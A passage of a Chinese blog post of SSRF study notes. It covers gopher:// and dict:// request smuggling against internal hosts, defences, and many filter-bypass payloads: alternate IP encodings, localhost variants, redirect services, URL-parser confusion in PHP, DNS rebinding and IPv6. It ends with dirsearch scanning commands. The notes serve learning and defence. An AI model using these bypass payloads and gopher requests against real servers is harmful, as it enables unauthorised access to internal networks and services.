<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /echo.php HTTP/1.1</span><br><span class="line">Host: 47.xxx.xxx.72</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">whoami=Bunny</span><br></pre></td></tr></table></figure>

<p>【<strong>上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami=Bunny”的长度。</strong>】</p>
<p>​            URL编码：</p>
<p>编码和GET方式一样的脚本，成功执行得到 HelloBunny</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://47.xxx.xxx.72:80/_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A</span><br></pre></td></tr></table></figure>



<h3 id="dict协议："><a href="#dict协议：" class="headerlink" title="dict协议："></a>dict协议：</h3><h4 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h4><p>​            DICT is a dictionary network protocol. Its goal is to allow clients to <strong>access a variety of dictionaries</strong> via a uniform interface.The protocol consists of a few commands a server must recognize so a client can access the available data and <strong>lookup word definitions</strong>. </p>
<h4 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a><strong>如何使用？</strong></h4><p>​            A dictd server can be used from Telnet.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet dict.org 2628</span><br></pre></td></tr></table></figure>

<p><code>这个协议架设的服务可以用 telnet 来登陆，说明这个协议应该是基于 tcp 协议开发的。</code></p>
<p><code>所以像 mysql 的服务，因为也是基于 tcp 协议开发，所以用 dict 协议的方式打开也能强行读取一些 mysql 服务的返回内容</code></p>
<h4 id="常用命令？"><a href="#常用命令？" class="headerlink" title="常用命令？"></a><strong>常用命令？</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">h：可以获取帮助</span><br><span class="line">show db：列出所有的字典</span><br><span class="line">define [字典名][单词]：获取一个单词的解释（例：define english hello）</span><br></pre></td></tr></table></figure>

<h4 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h4><p>​    通过dict协议来查看内网主机上<strong>开放的端口</strong>及端口上运行服务的<strong>版本</strong>信息等</p>
<img src="D:\blog\H01iday\source\_posts\pics\ssrf13.png" alt="ssrf13" style="zoom:67%;" />

<img src="D:\blog\H01iday\source\_posts\pics\ssrf14.png" alt="ssrf14" style="zoom:67%;" />

<img src="D:\blog\H01iday\source\_posts\pics\ssrf15.png" alt="ssrf15" style="zoom:67%;" />

<h2 id="03curl内容"><a href="#03curl内容" class="headerlink" title="03curl内容"></a>03curl内容</h2><ol>
<li><p>curl_init() — 初始化 cURL 会话，创建一个新cURL资源</p>
</li>
<li><p>curl_setopt ( resource $ch , int $option , mixed $value )<br>为给定的cURL会话句柄设置一个选项。</p>
<p>ch：由 curl_init() 返回的 cURL 句柄。</p>
<p>option：需要设置的CURLOPT_XXX选项。</p>
<p>value：将设置在option选项上的值</p>
<p>curl_setopt($ch, CURLOPT_URL, ‘<a target="_blank" rel="noopener" href="http://www.baidu.com&/#39;);%E8%AE%BE%E5%AE%9A%E8%AF%B7%E6%B1%82%E7%9A%84URL">www.baidu.com&#39;);设定请求的URL</a></p>
</li>
<li><p>curl_exec($ch)执行一个cURL会话</p>
</li>
<li><p>curl_close($ch)关闭一个surl会话</p>
</li>
</ol>
<h2 id="04漏洞出现的位置"><a href="#04漏洞出现的位置" class="headerlink" title="04漏洞出现的位置"></a>04漏洞出现的位置</h2><p>只要是服务器可以主动发起网络请求便可能出现</p>
<h2 id="05如何防御"><a href="#05如何防御" class="headerlink" title="05如何防御"></a>05如何防御</h2><p>​    ①过滤返回信息</p>
<p>​            验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>​    ②统一错误信息</p>
<p>​            避免用户可以根据错误信息来判断远程服务器的端口状态。</p>
<p>​    ③限制请求的端口为http常用的端口</p>
<p>​            比如，80,443,8080,8090</p>
<p>​    ④黑名单内网IP</p>
<p>​            限制不能访问内网的ip，防止对内网进行攻击</p>
<p>​    ⑤禁用不需要的协议</p>
<p>​            仅仅允许http和https请求。</p>
<p>​    ⑥限制域名</p>
<p>​            限制访问的域名只能为<code>http://www.xxx.com</code></p>
<h2 id="06过滤绕过"><a href="#06过滤绕过" class="headerlink" title="06过滤绕过"></a>06过滤绕过</h2><h3 id="url格式："><a href="#url格式：" class="headerlink" title="url格式："></a>url格式：</h3><p>格式：<code>URI = scheme:[//authority]path[?query] [#fragment]</code></p>
<pre><code>       `authority = [userinfo@]host[:port]`
</code></pre>
<p>​            1)scheme：协议include <code>http</code>, <code>https</code>, <code>ftp</code>, <code>mailto</code>, <code>file</code>, <code>data</code>, and <code>irc</code></p>
<p>​            2)authority：①userinfo：[username:password] ②host：将访问的域名/ip地址</p>
<p>​            3)query</p>
<table>
<thead>
<tr>
<th>Query delimiter</th>
<th>Example</th>
</tr>
</thead>
<tbody><tr>
<td>Ampersand (<code>&amp;</code>)</td>
<td><code>key1=value1&amp;key2=value2</code></td>
</tr>
<tr>
<td>Semicolon (<code>;</code>)</td>
<td><code>key1=value1;key2=value2</code></td>
</tr>
</tbody></table>
<h3 id="①更改ip地址写法："><a href="#①更改ip地址写法：" class="headerlink" title="①更改ip地址写法："></a>①更改ip地址写法：</h3><h4 id="改变编码"><a href="#改变编码" class="headerlink" title="改变编码"></a>改变编码</h4><p>一些开发者会通过对传过来的URL参数进行<strong>正则匹配</strong>的方式来过滤掉内网IP，<strong>如采用如下正则表达式</strong>：</p>
<p>内网ip：</p>
<ul>
<li>C类：192.168.0.0 - 192.168.255.255</li>
<li>B类：172.16.0.0 - 172.31.255.255</li>
<li>A类：10.0.0.0 - 10.255.255.255</li>
</ul>
<p><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$</code></p>
<p>200-249           250-255        [01]?：要有0/1中的0位或1位   故至少1位至多3位，且3位的是以0/1开头</p>
<p><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</code></p>
<p><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$</code></p>
<p>这三句就是过滤掉所有的内网ip地址</p>
<p>这种过滤方式可以改变ip地址写法来绕过：</p>
<p>比如地址：192.168.201.132</p>
<p>8进制：0300.0250.0311.0204【八进制数是0开头表示，这里的0是一个符号】</p>
<p>16进制：0xc0.0xa8.0xc9.0x84</p>
<p>10进制：3232287108</p>
<p>…</p>
<p>另外IP中的每一位，各个进制可以混用。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进制转换代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.201.132&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$ip</span>);</span><br><span class="line"><span class="variable">$r</span> = (<span class="variable">$ip</span>[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (<span class="variable">$ip</span>[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (<span class="variable">$ip</span>[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | <span class="variable">$ip</span>[<span class="number">3</span>] ;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$r</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$r</span> += <span class="number">4294967296</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十进制:&quot;</span>;     <span class="comment">// 2130706433</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;八进制:&quot;</span>;     <span class="comment">// 0177.0.0.1</span></span><br><span class="line"><span class="keyword">echo</span> decoct(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;十六进制:&quot;</span>;   <span class="comment">// 0x7f.0.0.1</span></span><br><span class="line"><span class="keyword">echo</span> dechex(<span class="variable">$r</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="指向127-0-0-1的其它表示"><a href="#指向127-0-0-1的其它表示" class="headerlink" title="指向127.0.0.1的其它表示"></a>指向127.0.0.1的其它表示</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/         # localhost就是代指127.0.0.1</span><br><span class="line">http://[0:0:0:0:0:ffff:127.0.0.1]/</span><br><span class="line">http://127。0。0。1/       # 用中文句号绕过</span><br><span class="line">http://①②⑦.⓪.⓪.①</span><br><span class="line">http://127.1/			  #仅windows可</span><br><span class="line">http://127.00000.00000.001/ # 0的数量多一点少一点都没影响 仅windows可</span><br></pre></td></tr></table></figure>

<h3 id="②使用解析到内网的域名"><a href="#②使用解析到内网的域名" class="headerlink" title="②使用解析到内网的域名"></a>②使用解析到内网的域名</h3><p>如果服务端直接过滤内网ip地址，而不是先将域名解析成ip再过滤内网地址。那么我们可以不使用内网ip地址，而是使用解析到内网的域名。比如，不用127.0.0.1，可以用localhost</p>
<p><strong>利用跳转302</strong></p>
<p>​            ①<code>http://nip.io</code> <code>http://sslip.io</code>这两个网址有特殊的功能</p>
<p>​            举个栗子：</p>
<p>​                10.0.0.1.nip.io   maps to   10.0.0.1</p>
<p>​                即访问10.0.0.1.nip.io会重定向到10.0.0.1。还有一些用法可以到上面的网址上具体看</p>
<p>​            ②<code>https://4m.cn/</code>短地址跳转绕过。这个就是输入一个地址A会生成一个短地址B。访问短地址B会自动302跳转到地址A。</p>
<p>​                </p>
<h3 id="③利用解析URL所出现的问题"><a href="#③利用解析URL所出现的问题" class="headerlink" title="③利用解析URL所出现的问题"></a>③利用解析URL所出现的问题</h3><p>​        当后端程序对访问的URL进行解析，可能对解析出来的host地址进行过滤。</p>
<p>​        通过解析URL不当，我们可以进行绕过</p>
<p>​        举个栗子：</p>
<p>​        <code>http://www.baidu.com@192.168.0.1/</code></p>
<p>​        当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容)当作是host地址时，那么这里就会将<code>www.baidu.com</code>当作host地址。</p>
<p>​        而实际上url真正解析会将<code>www.baidu.com</code>解析为userinfo用户信息，真正的host其实时192.168.0.1。利用后端程序进行过滤时解析url不当的漏洞，实现绕过。</p>
<h4 id="利用readfile和parse-url函数的解析差异绕过指定的端口"><a href="#利用readfile和parse-url函数的解析差异绕过指定的端口" class="headerlink" title="利用readfile和parse_url函数的解析差异绕过指定的端口"></a><strong>利用readfile和parse_url函数的解析差异绕过指定的端口</strong></h4><p>​        1）关于parse_url函数</p>
<p>​                parse_url(string <code>$url</code>, int <code>$component</code> )</p>
<p>​                解析url，返回关联数组，包含url的各个部分。</p>
<p>​                component：</p>
<p>​                指定 PHP_URL_SCHEME、 PHP_URL_HOST、 PHP_URL_PORT、 PHP_URL_USER、 PHP_URL_PASS、 PHP_URL_PATH、 PHP_URL_QUERY 或 PHP_URL_FRAGMENT 的其中一个来获取 URL 中指定的部分的内容。</p>
<p>​                举个栗子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://username:password@hostname/path?arg=value#anchor&#x27;</span>;</span><br><span class="line"></span><br><span class="line">print_r(parse_url(<span class="variable">$url</span>));<span class="comment">//output:Array ( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] =&gt; anchor )</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> parse_url(<span class="variable">$url</span>, PHP_URL_HOST);<span class="comment">//output:hostname</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        2）来看实例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span>. <span class="variable">$_GET</span>[url];</span><br><span class="line"><span class="variable">$parsed</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$parsed</span>[port] == <span class="number">80</span> )&#123;  <span class="comment">// 这里限制了我们传过去的url只能是80端口的</span></span><br><span class="line">	readfile(<span class="variable">$url</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\ssrf16.png" alt="ssrf16"></p>
<p>【simplehttpserver是什么：用于从一个电脑向另一个电脑传送文件的模块。使用方法：①进入待分享的目录，执行命令<code>python -m SimpleHTTPServer 端口号</code>  注意：大小写一定要区分。不填端口号则默认使用8000端口。 ②通过浏览器访问该主机的地址<a href="http://IP:端口号/文件名】">http://IP:端口号/文件名】</a></p>
<p>执行die</p>
<p><img src="D:\blog\H01iday\source_posts\pics\ssrf17.png" alt="ssrf17"></p>
<p>执行readfile</p>
<p><img src="D:\blog\H01iday\source_posts\pics\ssrf18.png" alt="ssrf18"></p>
<p>原因：parse_url解析的时候，认为后面的80为端口号。通过检验</p>
<p>​            而readfile函数解析的时候，认为前面的11211为端口号，故访问的是11211端口</p>
<p>​            所以能够读到开启simpleHttpServer的目录下面的flag.txt文件</p>
<p><img src="D:\blog\H01iday\source_posts\pics\ssrf19.jpg" alt="ssrf19"></p>
<p>这两个函数在解析host的时候也有区别</p>
<img src="D:\blog\H01iday\source\_posts\pics\ssrf20.jpg" alt="ssrf20" style="zoom:67%;" />

<h4 id="利用curl和parse-url的解析差异绕指定的host"><a href="#利用curl和parse-url的解析差异绕指定的host" class="headerlink" title="利用curl和parse_url的解析差异绕指定的host"></a>利用curl和parse_url的解析差异绕指定的host</h4><p>​        <img src="D:\blog\H01iday\source_posts\pics\ssrf22.jpg" alt="ssrf22"></p>
<p>测试代码：</p>
<p>在parse_url检测ip合法性的时候，检测的是google.com部分</p>
<p>在执行的时候是通过curl执行。检测的host是evil.com:80部分</p>
<p>【但是现在的curl版本已经不能再进行这种操作了，打了补丁，我尝试了很多都不能复现。所以这个部分就看作是一个参考】</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">//对文件进行语法高亮显示。</span></span><br><span class="line"><span class="comment">//该函数为过滤作用</span></span><br><span class="line"><span class="comment">//①是否为http/https协议</span></span><br><span class="line"><span class="comment">//②解析域名，看ip地址是否为内网地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="comment">//^匹配输入字符串的开始位置。</span></span><br><span class="line">    <span class="comment">//^在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合</span></span><br><span class="line">    <span class="comment">//$匹配输入字符串的结尾位置。</span></span><br><span class="line">    <span class="comment">//|两项之间的一个选择</span></span><br><span class="line">    <span class="comment">//?匹配前面的子表达式零次或一次</span></span><br><span class="line">    <span class="comment">//*匹配前面的子表达式零次或多次</span></span><br><span class="line">    <span class="comment">//.匹配除换行符 \n 之外的任何单字符</span></span><br><span class="line">    <span class="comment">//这里只允许http和https两种协议</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);<span class="comment">//通过域名返回主机名</span></span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);<span class="comment">//将 IPV4 的字符串互联网协议转换成长整型数字</span></span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> ||</span><br><span class="line">            ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> ||</span><br><span class="line">          ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> ||</span><br><span class="line">          ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">          <span class="comment">// 检查是否是内网ip</span></span><br><span class="line">          <span class="comment">//$a &gt;&gt; $b将 $a 中的位向右移动 $b 次（每一次移动都表示“除以 2”）。</span></span><br><span class="line">          <span class="comment">//&gt;&gt;24其实就是显示前8位(2进制)</span></span><br><span class="line">          <span class="comment">//172.16.0.0 - 172.31.255.255前面16位</span></span><br><span class="line">          <span class="comment">//10101100 00010000</span></span><br><span class="line">          <span class="comment">//10101100 00011111</span></span><br><span class="line">          <span class="comment">//故可以知道只需要前面12位相同即可。即右移32-12=20位</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//访问给定url</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//先检查是否安全</span></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);<span class="comment">//使返回的内容作为变量储存，而不是直接输出。</span></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);<span class="comment">//不反悔http 请求的response信息</span></span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);<span class="comment">//获取CURL请求输出的相关信息  类型为数组</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])<span class="comment">//如果有重定向函数，再进行一次检查；通过检查才能执行redirect跳转</span></span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">        print_r (<span class="variable">$result_info</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hahha&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;version:&quot;</span>;</span><br><span class="line">        print_r(curl_version());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="④DNS-Rebinding"><a href="#④DNS-Rebinding" class="headerlink" title="④DNS Rebinding"></a>④DNS Rebinding</h3><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。【生存时间(<em>TTL</em>),来定义数据在缓存中的存放时间,生存时间一到期,名称<em>服务器</em>就丢弃原有的缓存数据并从权威名称<em>服务器</em>获取新的数据。】这样就可以进行攻击了，完整的攻击流程为：</p>
<ul>
<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。 </li>
<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
</ul>
<h3 id="⑤利用IPv6"><a href="#⑤利用IPv6" class="headerlink" title="⑤利用IPv6"></a>⑤利用IPv6</h3><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code> 或IPv6的内网域名来绕过过滤。</p>
<h2 id="PortSwigger"><a href="#PortSwigger" class="headerlink" title="PortSwigger"></a>PortSwigger</h2><h3 id="1-攻击当前服务器"><a href="#1-攻击当前服务器" class="headerlink" title="1. 攻击当前服务器"></a>1. 攻击当前服务器</h3><h3 id="2-攻击其它后端服务器"><a href="#2-攻击其它后端服务器" class="headerlink" title="2. 攻击其它后端服务器"></a>2. 攻击其它后端服务器</h3><h3 id="3-基于黑名单防御机制的SSRF绕过"><a href="#3-基于黑名单防御机制的SSRF绕过" class="headerlink" title="3. 基于黑名单防御机制的SSRF绕过"></a>3. 基于黑名单防御机制的SSRF绕过</h3><h3 id="4-基于白名单防御机制的SSRF绕过"><a href="#4-基于白名单防御机制的SSRF绕过" class="headerlink" title="4. 基于白名单防御机制的SSRF绕过"></a>4. 基于白名单防御机制的SSRF绕过</h3><h2 id="目录扫描dirsearch"><a href="#目录扫描dirsearch" class="headerlink" title="目录扫描dirsearch"></a>目录扫描dirsearch</h2><p>简单使用【仅在python3.7及以上版本可用】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br><span class="line">-u：url</span><br><span class="line">-e:表示文件的后缀名</span><br><span class="line">--exclude-status 503:指排除503状态码的内容</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">H01iday</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  





</body>
</html>
